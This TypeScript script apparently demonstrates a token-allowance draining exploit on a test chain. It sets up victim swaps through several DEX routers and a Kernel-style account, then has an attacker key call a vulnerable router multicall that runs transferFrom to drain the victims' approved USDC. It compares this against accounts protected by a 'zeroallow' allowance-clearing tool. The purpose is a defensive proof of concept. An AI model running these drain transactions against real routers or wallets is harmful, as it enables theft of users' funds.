import { decodeErrorResult, encodeAbiParameters, encodeFunctionData, formatEther, maxUint256, parseAbi, parseAbiParameters, parseEther, type Address, type Hex } from 'viem'
import {
  CMD,
  MSG_SENDER,
  PERMIT2,
  V4,
  compile,
  compileCalls,
  encodeUr,
  erc20Abi,
  hookAbi,
  permit2Abi,
  routeDirect,
  specExample,
  v3Path,
  type Call,
} from '../packages/core/src/index.js'
import { addr, hegota, keys, pub, send, wallet } from './lib.js'
import { setup } from './setup.js'

const d = await setup()
const deadline = (await pub.getBlock()).timestamp + 3600n
const attacker = addr(keys.attacker)
const A = d.victims.asked
const D = d.victims.direct
const approve = (spender: Address): Call => ({ to: d.usdc, data: encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [spender, maxUint256] }) })
const permit2Grants = (): Call[] => [
  approve(PERMIT2),
  { to: PERMIT2, data: encodeFunctionData({ abi: permit2Abi, functionName: 'approve', args: [d.usdc, d.ur, (1n << 160n) - 1n, 2 ** 48 - 1] }) },
]
const sr02 = parseAbi([
  'function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] path, address to) payable returns (uint256)',
  'function multicall(uint256 deadline, bytes[] data) payable returns (bytes[])',
  'function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] path, address to, uint256 deadline) returns (uint256[])',
])
const exploitAbi = parseAbi(['function multicall(address target, bytes data) returns (bytes)'])
const pull = (v: Address, amt: bigint) => ({ target: d.usdc as Address, data: encodeFunctionData({ abi: erc20Abi, functionName: 'transferFrom', args: [v, attacker, amt] }) })
const viaPermit2 = (v: Address, amt: bigint) => ({
  target: PERMIT2 as Address,
  data: encodeFunctionData({ abi: parseAbi(['function transferFrom(address from, address to, uint160 amount, address token)']), functionName: 'transferFrom', args: [v, attacker, amt, d.usdc] }),
})
const usdc = (o: Address) => pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'balanceOf', args: [o] })
const weth = (o: Address) => pub.readContract({ address: d.weth, abi: erc20Abi, functionName: 'balanceOf', args: [o] })

const nativeOut = encodeAbiParameters(parseAbiParameters('bytes, bytes[]'), [
  `0x${[V4.SWAP_EXACT_IN_SINGLE, V4.SETTLE_ALL, V4.TAKE_ALL].map((x) => x.toString(16).padStart(2, '0')).join('')}`,
  [
    encodeAbiParameters(parseAbiParameters('((address, address, uint24, int24, address), bool, uint128, uint128, bytes)'), [
      [[d.nativeKey.currency0, d.nativeKey.currency1, 3000, 60, d.nativeKey.hooks], false, parseEther('1'), 1n, '0x'],
    ]),
    encodeAbiParameters(parseAbiParameters('address, uint256'), [d.usdc, parseEther('1')]),
    encodeAbiParameters(parseAbiParameters('address, uint256'), ['0x0000000000000000000000000000000000000000', 1n]),
  ],
])

type Route = { name: string; router: Address; request: (who: Address) => Call[]; steal: (v: Address, amt: bigint) => { target: Address; data: Hex }; out: (who: Address) => Promise<bigint>; unit: string }
const routes: Route[] = [
  {
    name: 'SwapRouter02 V2 swap, multicall(deadline, [swapExactTokensForTokens])',
    router: d.router3,
    request: () => [approve(d.router3), { to: d.router3, data: encodeFunctionData({ abi: sr02, functionName: 'multicall', args: [deadline, [encodeFunctionData({ abi: sr02, functionName: 'swapExactTokensForTokens', args: [parseEther('100'), 1n, [d.usdc, d.weth], MSG_SENDER] })]] }) }],
    steal: pull,
    out: weth,
    unit: 'WETH',
  },
  {
    name: 'V2 router exact output, swapTokensForExactTokens(0.01 WETH, max 100 USDC)',
    router: d.router2,
    request: (who) => [approve(d.router2), { to: d.router2, data: encodeFunctionData({ abi: sr02, functionName: 'swapTokensForExactTokens', args: [parseEther('0.01'), parseEther('100'), [d.usdc, d.weth], who, deadline] }) }],
    steal: pull,
    out: weth,
    unit: 'WETH',
  },
  {
    name: 'Universal Router PERMIT2_TRANSFER_FROM then a payerIsUser=false swap',
    router: d.ur,
    request: () => [
      ...permit2Grants(),
      {
        to: d.ur,
        data: encodeUr({
          commands: [CMD.PERMIT2_TRANSFER_FROM, CMD.V3_SWAP_EXACT_IN],
          inputs: [
            encodeAbiParameters(parseAbiParameters('address, address, uint160'), [d.usdc, '0x0000000000000000000000000000000000000002', parseEther('100')]),
            encodeAbiParameters(parseAbiParameters('address, uint256, uint256, bytes, bool'), [MSG_SENDER, 1n << 255n, 1n, v3Path([{ a: d.usdc, fee: 3000, b: d.weth }]), false]),
          ],
          deadline,
        }),
      },
    ],
    steal: viaPermit2,
    out: weth,
    unit: 'WETH',
  },
  {
    name: 'Universal Router V4_SWAP paying out native ETH (USDC -> ETH)',
    router: d.ur,
    request: () => [...permit2Grants(), { to: d.ur, data: encodeUr({ commands: [CMD.V4_SWAP], inputs: [nativeOut], deadline }) }],
    steal: viaPermit2,
    out: (who) => pub.getBalance({ address: who }),
    unit: 'ETH (before gas)',
  },
]

const w = wallet(keys.attacker)
for (const r of routes) {
  console.log(`\n=== ${r.name}  ${r.router}`)
  for (const who of [A, D]) await d.topUp(d.usdc, who)
  const [oa, od] = [await r.out(A), await r.out(D)]
  const fa = specExample({ calls: r.request(A) })
  const ra = await send({ sender: A, signerKey: keys.asked, frames: fa })
  const routed = await routeDirect(pub, { sender: D, seal: d.seal, permit2: PERMIT2, calls: r.request(D) }, { swapper: d.swapper })
  for (const n of routed.notes) console.log(`   ${n}`)
  const { frames: fd } = compile(routed)
  const rd = await send({ sender: D, signerKey: keys.direct, frames: fd })
  console.log(`A request: ${ra.receipt?.frameReceipts.map((f) => f.status).join(',')}   D direct: ${rd.receipt?.frameReceipts.map((f) => f.status).join(',')}  tx ${rd.hash}`)
  console.log(`out (${r.unit})  A ${formatEther((await r.out(A)) - oa)}   D ${formatEther((await r.out(D)) - od)}`)
  for (const [name, victim] of [['A', A], ['D', D]] as const) {
    const bal = await usdc(victim)
    const s = r.steal(victim, bal)
    try {
      await pub.simulateContract({ account: attacker, address: r.router, abi: exploitAbi, functionName: 'multicall', args: [s.target, s.data] })
    } catch {
      console.log(`   exploit vs ${name}: reverts, keeps ${formatEther(bal)} USDC`)
      continue
    }
    const hash = await w.writeContract({ address: r.router, abi: exploitAbi, functionName: 'multicall', args: [s.target, s.data], gas: 250_000n })
    await pub.waitForTransactionReceipt({ hash, timeout: 600_000 })
    console.log(`   exploit vs ${name}: drained ${formatEther(bal)} USDC  tx ${hash}`)
  }
}

console.log(`\n=== Kernel-style account ${d.kernel} with ZeroAllowHook ${d.hook} (no frame opcodes involved)`)
const K = d.kernel
const kernelAbi = parseAbi(['function executeUserOp(bytes inner) payable', 'function execute(bytes32 mode, bytes executionCalldata) payable'])
const routerAbi = parseAbi(['function swapExactIn(address,address,uint256,uint256,address) returns (uint256)'])
const userOp = (calls: Call[]) =>
  encodeFunctionData({
    abi: kernelAbi,
    functionName: 'executeUserOp',
    args: [
      encodeFunctionData({
        abi: kernelAbi,
        functionName: 'execute',
        args: [`0x01${'00'.repeat(31)}`, encodeAbiParameters(parseAbiParameters('(address target, uint256 value, bytes callData)[]'), [calls.map((c) => ({ target: c.to, value: c.value ?? 0n, callData: c.data }))])],
      }),
    ],
  })
const dapp: Call[] = [approve(d.router), { to: d.router, data: encodeFunctionData({ abi: routerAbi, functionName: 'swapExactIn', args: [d.usdc, d.weth, parseEther('10'), 0n, K] }) }]
const dw = wallet(keys.deployer)
try {
  await pub.call({ account: addr(keys.deployer), to: K, data: userOp(dapp) })
} catch (e) {
  const raw = (e as { walk?: (f: (x: unknown) => boolean) => unknown }).walk?.((x) => typeof (x as { data?: unknown }).data === 'string') as { data?: Hex } | undefined
  let why = 'reverted'
  try {
    const err = decodeErrorResult({ abi: hookAbi, data: raw!.data! })
    why = `${err.errorName}(${err.args?.map(String).join(', ')})`
  } catch {}
  console.log(`   dApp batch as a user operation: ${why}`)
}
const leak = await dw.sendTransaction({ to: K, data: userOp(dapp), gas: 400_000n, chain: hegota })
console.log(`   sent anyway: ${(await pub.waitForTransactionReceipt({ hash: leak, timeout: 600_000 })).status}  tx ${leak}`)
const { calls } = compileCalls({ sender: K, seal: d.seal, permit2: PERMIT2, calls: dapp })
const ok = await dw.sendTransaction({ to: K, data: userOp(calls), chain: hegota })
const okr = await pub.waitForTransactionReceipt({ hash: ok, timeout: 600_000 })
console.log(`   compiled by zeroallow: ${okr.status}, gas ${okr.gasUsed}, allowance left ${formatEther(await pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'allowance', args: [K, d.router] }))}  tx ${ok}`)
try {
  await pub.simulateContract({ account: attacker, address: d.router, abi: exploitAbi, functionName: 'multicall', args: [d.usdc, pull(K, 1n).data] })
  console.log('   exploit vs Kernel-style account: would succeed')
} catch {
  console.log(`   exploit vs Kernel-style account: reverts, keeps ${formatEther(await usdc(K))} USDC`)
}
